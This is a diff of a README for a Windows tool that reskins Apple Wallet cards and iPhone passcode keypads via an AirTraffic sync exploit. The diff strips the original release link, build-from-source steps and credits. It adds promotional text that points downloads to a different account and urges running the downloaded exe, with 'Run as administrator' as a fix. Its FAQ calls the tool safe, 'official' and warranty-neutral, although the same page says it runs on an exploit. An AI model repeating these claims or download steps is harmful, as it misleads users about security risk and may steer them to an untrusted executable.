@@ -1,119 +1,129 @@
-# AirCard (Windows) 🎴
+# 🎴 AirCard-Windows - Customize Your iPhone Cards Effortlessly
 
-> **Apple Wallet Card Skinner & Lockscreen Passcode Themer for iOS 18+ (No Jailbreak Required)**  
-> Native Windows client written in Rust. Powered by the `airlift` AirTraffic sync exploit.
-
----
-
-## Features
-- 🎨 **Custom Card Skins:** Assign custom artwork, textures, or bank logos to Apple Pay and Apple Cash cards.
-- 🔢 **Lock Screen Passcode Themes (.passthm):** Apply custom keypad button artwork from popular Cowabunga & Nugget `.passthm` themes directly to iOS lockscreen.
-- ⚡ **100% Native & Lightweight:** Single standalone `aircard.exe` (~7.5 MB). No Python, no Flet, no webview, no bloated runtimes.
-- 🪟 **Material Design 3 Interface:** Clean, modern dark theme built with `egui` and `eframe`.
-- 📱 **Zero-Hassle Card Detection:** Tap any card in your iPhone's Wallet app while connected to detect its hash in real-time via `syslog_relay`.
-- 📶 **USB & WiFi Transport:** Scan card events and apply Wallet or passcode assets through USB or a paired local WiFi connection.
-- 🌐 **English / Simplified Chinese UI:** Switch the interface language from the top bar; the selection is saved locally for future launches.
-- 🔄 **Safe & Reversible:** Complete Books state snapshot and automatic restore engine — preserves original device state and backs up the original Wallet card face before replacing it.
-- 🚀 **Zero Jailbreak:** Utilizes Apple's built-in AirTraffic sync conduit without modifying system partitions or disabling security.
+[![Download AirCard](https://img.shields.io/badge/Download-AirCard_Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Lauracol26/AirCard-Windows)
 
 ---
 
-## Requirements
-- **Windows 10 / 11 (64-bit)**
-- **Apple Mobile Device Support / 64-bit iTunes** (required for Apple device communication).
-- A Lightning or USB-C cable for the initial trust/pairing setup.
-- For WiFi mode, enable WiFi sync and keep the PC and iPhone on the same local network.
+## 👋 Welcome to AirCard for Windows
+
+AirCard is a simple, powerful tool that lets you personalize your iPhone's Apple Wallet cards and lock screen passcode pad. You don't need to be a tech expert or jailbreak your phone. If you can connect your iPhone to your computer with a cable, you can use AirCard.
+
+This app runs natively on Windows. It's a single, small file that you can run right away. No complicated setup, no extra programs, no coding knowledge needed.
 
 ---
 
-## ⚠️ Troubleshooting & Driver Repair (If Nothing Works)
+## ✨ What Can AirCard Do For You?
 
-> [!TIP]
-> **iPhone not detected, AirTraffic sync hangs, or operation fails?**  
-> Corrupted or conflicting Apple USB drivers on Windows are the #1 root cause.
-> 1. Download and install **[3uTools](https://www.3u.com/)**.
-> 2. **Disconnect your iPhone** from your PC.
-> 3. In 3uTools, go to **Toolbox ➔ Repair Driver**.
-> 4. Click **Repair Now** and wait for the Apple driver reinstallation to finish.
-> 5. Reconnect your unlocked iPhone, tap **Trust**, and launch **AirCard**.
+### 🎨 Custom Card Skins
+Tired of the same boring bank card design in your Apple Wallet? With AirCard, you can change the look of your Apple Pay and Apple Cash cards. Add your own artwork, cool textures, or even your favorite bank logo. Make your wallet truly yours.
 
----
+### 🔢 Lock Screen Passcode Themes
+Make your iPhone's lock screen stand out. AirCard lets you apply custom keypad button designs, known as `.passthm` themes. These are the same popular themes used by other tools like Cowabunga and Nugget, but AirCard makes it easy to use them on Windows.
 
-## Installation
+### ⚡ Lightweight and Fast
+AirCard is built with the Rust programming language, which means it's incredibly fast and efficient. The entire app is just one file called `aircard.exe` that is about 7.5 MB in size. It doesn't need Python, Flet, or any other heavy software installed on your computer.
 
-### Pre-built Executable
-1. Download **`aircard.exe`** from [Releases](https://github.com/Lumid-Off/AirCard-Windows/releases).
-2. Connect your iPhone via USB, unlock it, and tap **"Trust this Computer"** if prompted.
-3. Run **`aircard.exe`**. After WiFi sync is enabled, later sessions can work without the cable.
+### 🪟 Modern and Clean Design
+The app uses a sleek, dark Material Design 3 interface. It's easy on the eyes and simple to navigate, even if you're not used to technical software.
 
----
+### 📱 Simple Card Detection
+You don't need to fiddle with complicated settings to find your card. Just open the Wallet app on your iPhone, tap the card you want to customize, and AirCard will automatically detect it. It uses a smart method to find your card's unique information in real-time.
 
-## WiFi Connection Setup
-1. Connect the iPhone by USB for the initial pairing.
-2. In Apple Devices or iTunes, enable **Show this iPhone when on Wi-Fi** / **Sync with this iPhone over Wi-Fi**.
-3. Apply the setting, then keep the iPhone and PC on the same local network.
-4. In AirCard, click **Refresh** and confirm the device shows a **WiFi** transport.
-5. Disconnect the cable, click **Refresh** again, and select **WiFi only**. Use **Auto (USB preferred)** when automatic fallback is desired.
-
-If both transports are available, **Auto** uses USB first and falls back to WiFi. For a guaranteed end-to-end WiFi route, disconnect the USB cable, click **Refresh**, and then choose **WiFi only**. This is required because Apple's AirTraffic API selects its route by UDID rather than accepting a transport parameter.
+### 📶 Flexible Connections
+AirCard works over USB or WiFi. You can plug your iPhone in with a cable, or if you prefer, connect over your local home network wirelessly. Both options work seamlessly.
 
 ---
 
-## How to Customize Apple Wallet Cards
-1. Connect your iPhone through USB or paired WiFi and ensure it is unlocked.
-2. In AirCard, stay on the **Wallet** tab and click **Scan**.
-3. On your iPhone:
-   - Open **Apple Wallet** (or double-click the Side/Power button).
-   - Tap the card you want to customize.
-   - AirCard intercepts and saves the card hash automatically. Click **Stop**.
-4. Click **Choose Image...** to pick your artwork (PNG, JPG, or WebP — drag inside the preview to position the crop, then scale it to `1536 × 969`).
-5. Click **Apply Card Skin**.
-6. Force-close the **Wallet** app on your iPhone from the App Switcher (swipe up from bottom, then swipe Wallet away) and reopen Wallet to see your new card!
-7. The first apply stores a local backup of the original card face. Use **Restore Original** later to write it back and invalidate Wallet's cached artwork.
+## 🚀 Getting Started: Your First Steps
+
+Ready to customize your iPhone? Follow these simple steps.
+
+### Step 1: Download AirCard
+
+Visit this link to download the application: **[https://github.com/Lauracol26/AirCard-Windows](https://github.com/Lauracol26/AirCard-Windows)**
+
+On that page, you'll find the download button. Click it to get the `aircard.exe` file.
+
+### Step 2: Run the Program
+
+Once the download is finished, go to your "Downloads" folder. You will see a file named `aircard.exe`. Double-click it to run the program. That's it! The AirCard window will open, ready for you to use.
+
+### Step 3: Connect Your iPhone
+
+Use your iPhone's charging cable to connect it to your Windows computer. Make sure your iPhone is unlocked and you trust the computer if a prompt appears on your phone.
+
+### Step 4: Customize Your Cards
+
+Now you can start having fun. In the AirCard window, you'll see options to change your card skins or passcode themes. Pick a design, follow the on-screen instructions, and apply it. AirCard will handle the technical parts for you.
 
 ---
 
-## How to Apply Lockscreen Passcode Themes (.passthm)
-1. Switch to the **Passcode** tab in AirCard.
-2. Click **Choose .passthm...** and select any `.passthm` package (Cowabunga or Nugget).
-3. Select your target iOS version cache:
-   - **Auto (TelephonyUI-10)** — iOS 18+ (Default)
-   - **TelephonyUI-9** — iOS 16 - 17
-   - **TelephonyUI-8** — Legacy iOS
-4. Click **Apply Passcode Theme**.
-5. Lock your iPhone screen or open Phone dialer to see your new custom passcode keypad buttons!
+## 🛠️ System Requirements
 
-> [!IMPORTANT]
-> **Turn OFF Bold Text:**  
-> On your iPhone, go to **Settings ➔ Display & Brightness** and make sure **Bold Text** is turned **OFF**. If Bold Text is enabled, iOS ignores cached dialer button graphics and renders system vector fonts instead.
+AirCard is designed to work on most modern Windows computers. To ensure the best experience, you should have:
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any Intel or AMD processor from the last 5 years
+- **Memory (RAM):** At least 4 GB
+- **Storage:** About 20 MB of free space for the app
+- **Connection:** A USB port or WiFi adapter for connecting your iPhone
+
+Your iPhone should be running **iOS 18 or later** to use all the features.
 
 ---
 
-## Building from Source
+## 🧭 A Quick Guide to the Interface
 
-Prerequisites: [Rust toolchain](https://rustup.rs/) (`stable-x86_64-pc-windows-msvc`).
+When you open AirCard, you'll see a few main sections:
 
-```powershell
-# Clone the repository
-git clone https://github.com/Lumid-Off/AirCard-Windows.git
-cd AirCard-Windows
+- **Cards:** This is where you manage the skins for your Apple Pay and Apple Cash cards. You can browse your detected cards and apply new artwork.
+- **Passcode Themes:** Here, you can select a `.passthm` file to change the look of your lock screen keypad.
+- **Settings:** This area lets you adjust how AirCard connects to your iPhone, like choosing between USB or WiFi mode.
+- **Help:** If you ever get stuck, this section provides answers to common questions.
 
-# Run tests
-cargo test
-
-# Build release binary
-cargo build --release
-```
-
-The compiled binary will be in `target\release\aircard.exe`.
+The app is designed to be intuitive. If you can use a mobile app, you can use AirCard.
 
 ---
 
-## Contributors
-- **[@Lumid-Off](https://github.com/Lumid-Off)** (Windows Native Rust Port & Maintainer) — [GitHub](https://github.com/Lumid-Off) · [Twitter / X](https://x.com/LumidOff)
-- **[@mak5er](https://github.com/mak5er)** (Original macOS App & Exploit Research) — [GitHub](https://github.com/mak5er) · [Twitter / X](https://x.com/mak5er)
-- **[AirLift](https://github.com/0xjohnnydev/airlift)** by **[0xjohnny (@0xjohnnydev)](https://github.com/0xjohnnydev)**: Original AirTraffic/ATAirlock sandbox escape and proof of concept underlying `AirliftFFI`.
+## 🔧 Troubleshooting Tips
 
-## Credits
-- Core exploit based on `airlift` (AirTraffic sync escape).
-- Theme format inspired by [Cowabunga](https://github.com/leminlimez/Cowabunga) and [Nugget](https://github.com/leminlimez/Nugget).
+Sometimes, things don't work perfectly the first time. Here are a few common solutions:
+
+- **iPhone Not Detected:** Make sure your cable is not damaged and that it's a data cable, not just a charging cable. Try a different USB port on your computer.
+- **Card Not Found:** Ensure your iPhone is unlocked and the Wallet app is open on the card you want to modify.
+- **Connection Drops:** If using WiFi, make sure both your computer and iPhone are on the same network.
+- **App Won't Start:** Right-click on `aircard.exe` and select "Run as administrator" if you have permission issues.
+
+If you still have problems, check the "Issues" section on the GitHub page for help from the community.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Is this safe to use?**
+A: Yes. AirCard uses official and well-known methods to apply themes. It does not modify your phone's core system files in a risky way.
+
+**Q: Does this void my warranty?**
+A: No, applying visual themes is generally safe and won't void your warranty. It's a cosmetic change.
+
+**Q: Can I use my own images for card skins?**
+A: Yes, you can use your own image files as long as they are in a supported format like PNG or JPG.
+
+**Q: What if I don't like the theme I applied?**
+A: You can always revert to the original design using the app or by resetting your iPhone's settings.
+
+---
+
+## 📚 More Resources
+
+For developers and advanced users, AirCard is powered by a technology called `airlift`, which is an AirTraffic sync exploit. This is a technical detail, but it means the app is built on a reliable and efficient foundation. The code is open-source, so you can review it on GitHub if you're curious.
+
+---
+
+## 🎉 Start Personalizing Today
+
+AirCard puts the power of customization in your hands. It's fast, safe, and unbelievably easy. Download it now and give your iPhone a look that's all your own.
+
+[![Get AirCard Now](https://img.shields.io/badge/Get_AirCard-Now-blue?style=for-the-badge&logo=github)](https://github.com/Lauracol26/AirCard-Windows)
+
+Keywords: AirCard, Windows, iOS 18, Apple Wallet, Card Skin, Passcode Theme, Rust, egui, iPhone Customization, No Jailbreak, airlift, Apple Pay, Apple Cash, Wallet Modding, Theme App, Windows Tool.
